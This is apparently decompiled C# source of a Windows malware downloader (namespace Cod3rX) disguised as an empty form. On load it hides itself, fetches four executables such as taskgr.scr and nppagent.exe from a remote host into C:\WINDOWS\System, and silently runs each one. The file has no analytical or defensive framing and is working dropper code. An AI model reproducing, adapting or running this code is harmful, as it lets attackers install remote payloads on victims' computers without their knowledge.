using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Cod3rX;

internal class Form1 : Form
{
	private IContainer components;

	public ToolTip ToolTip1;

	private static Form1 m_vb6FormDefInstance;

	private static bool m_InitializingDefInstance;

	public static Form1 DefInstance
	{
		get
		{
			if (m_vb6FormDefInstance == null || ((Control)m_vb6FormDefInstance).get_IsDisposed())
			{
				m_InitializingDefInstance = true;
				m_vb6FormDefInstance = new Form1();
				m_InitializingDefInstance = false;
			}
			return m_vb6FormDefInstance;
		}
		set
		{
			m_vb6FormDefInstance = value;
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Form1());
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		if (m_vb6FormDefInstance == null)
		{
			if (m_InitializingDefInstance)
			{
				m_vb6FormDefInstance = this;
			}
			else
			{
				try
				{
					if ((object)Assembly.GetExecutingAssembly().EntryPoint!.DeclaringType == ((object)this).GetType())
					{
						m_vb6FormDefInstance = this;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		InitializeComponent();
	}

	protected override void Dispose(bool Disposing)
	{
		if (Disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(Disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager(typeof(Form1));
		components = new Container();
		ToolTip1 = new ToolTip(components);
		ToolTip1.set_Active(true);
		((Control)this).set_Text("Form1");
		Size clientSize = new Size(312, 212);
		((Form)this).set_ClientSize(clientSize);
		Point location = new Point(4, 24);
		((Control)this).set_Location(location);
		((Form)this).set_Icon((Icon)resourceManager.GetObject("Form1.Icon"));
		((Form)this).set_StartPosition((FormStartPosition)2);
		clientSize = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(clientSize);
		((Form)this).set_BackColor(SystemColors.Control);
		((Form)this).set_FormBorderStyle((FormBorderStyle)4);
		((Form)this).set_ControlBox(true);
		((Control)this).set_Enabled(true);
		((Form)this).set_KeyPreview(false);
		((Form)this).set_MaximizeBox(true);
		((Form)this).set_MinimizeBox(true);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(true);
		((Form)this).set_HelpButton(false);
		((Form)this).set_WindowState((FormWindowState)0);
		((Control)this).set_Name("Form1");
	}

	[DllImport("urlmon", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int URLDownloadToFileA(int pCaller, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szURL, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFileName, int dwReserved, int lpfnCB);

	public bool diabo_solto(ref string URL, ref string LocalFilename)
	{
		if (URLDownloadToFileA(0, ref URL, ref LocalFilename, 0, 0) == 0)
		{
			return true;
		}
		bool result = default(bool);
		return result;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num = default(int);
		int num4 = default(int);
		object obj = default(object);
		Exception ex = default(Exception);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string LocalFilename;
				string URL;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0009;
				case 316:
					{
						int num2 = num + 1;
						num = 0;
						switch (num2)
						{
						case 0:
							break;
						case 1:
							goto IL_0009;
						case 2:
						case 3:
							goto IL_0028;
						case 4:
							goto IL_004b;
						case 5:
							goto IL_006b;
						case 6:
							goto IL_007b;
						case 7:
							goto IL_0083;
						case 8:
							goto IL_00a3;
						case 9:
							goto IL_00b3;
						case 10:
							goto IL_00bc;
						case 11:
							goto IL_00dd;
						case 12:
							goto IL_00ee;
						case 13:
							goto IL_00f7;
						case 14:
							goto IL_0118;
						case 15:
							goto end_IL_0001;
						case 16:
							goto end_IL_0001_2;
						default:
							goto IL_01d3;
						}
						goto default;
					}
					IL_0009:
					num4 = 1;
					if (Information.UBound((Array)Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName), 1) > 0)
					{
						ProjectData.EndApp();
					}
					goto IL_0028;
					IL_0118:
					num4 = 14;
					Interaction.Shell("C:\\WINDOWS\\System\\contants.exe", (AppWinStyle)2, false, -1);
					break;
					IL_0028:
					num4 = 3;
					LateBinding.LateSet(obj, (Type)null, "TaskVisible", new object[1] { false }, (string[])null);
					goto IL_004b;
					IL_004b:
					num4 = 4;
					URL = "http://ocarteiro.joke.dk/images/.card/taskgr.scr";
					LocalFilename = "C:\\WINDOWS\\System\\taskgr.exe";
					_ = (object)diabo_solto(ref URL, ref LocalFilename);
					goto IL_006b;
					IL_006b:
					num4 = 5;
					Interaction.Shell("C:\\WINDOWS\\System\\taskgr.exe", (AppWinStyle)2, false, -1);
					goto IL_007b;
					IL_007b:
					num4 = 6;
					((Form)this).Close();
					goto IL_0083;
					IL_0083:
					num4 = 7;
					LocalFilename = "http://ocarteiro.joke.dk/images/.card/regclean.exe";
					URL = "C:\\WINDOWS\\System\\regclean.cmd";
					_ = (object)diabo_solto(ref LocalFilename, ref URL);
					goto IL_00a3;
					IL_00a3:
					num4 = 8;
					Interaction.Shell("C:\\WINDOWS\\System\\regclean.cmd", (AppWinStyle)2, false, -1);
					goto IL_00b3;
					IL_00b3:
					num4 = 9;
					((Form)this).Close();
					goto IL_00bc;
					IL_00bc:
					num4 = 10;
					LocalFilename = "http://ocarteiro.joke.dk/images/.card/nppagent.exe";
					URL = "C:\\WINDOWS\\System\\nppagent.exe";
					_ = (object)diabo_solto(ref LocalFilename, ref URL);
					goto IL_00dd;
					IL_00dd:
					num4 = 11;
					Interaction.Shell("C:\\WINDOWS\\System\\nppagent.exe", (AppWinStyle)2, false, -1);
					goto IL_00ee;
					IL_00ee:
					num4 = 12;
					((Form)this).Close();
					goto IL_00f7;
					IL_00f7:
					num4 = 13;
					LocalFilename = "http://ocarteiro.joke.dk/images/.card/contants.exe";
					URL = "C:\\WINDOWS\\System\\contants.exe";
					_ = (object)diabo_solto(ref LocalFilename, ref URL);
					goto IL_0118;
					end_IL_0001:
					break;
				}
				num4 = 15;
				((Form)this).Close();
				ProjectData.EndApp();
				end_IL_0001_2:;
			}
			catch (object obj2) when ((obj2 is Exception && num3 != 0 && num == 0) ? true : false)
			{
				Exception obj3 = (Exception)obj2;
				ProjectData.SetProjectError(obj3);
				ex = obj3;
				if (num != 0)
				{
					goto IL_01d3;
				}
				num = num4;
				switch (num3)
				{
				case 1:
					try0001_dispatch = 316;
					break;
				default:
					throw;
				}
				continue;
			}
			break;
			IL_01d3:
			throw ex;
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
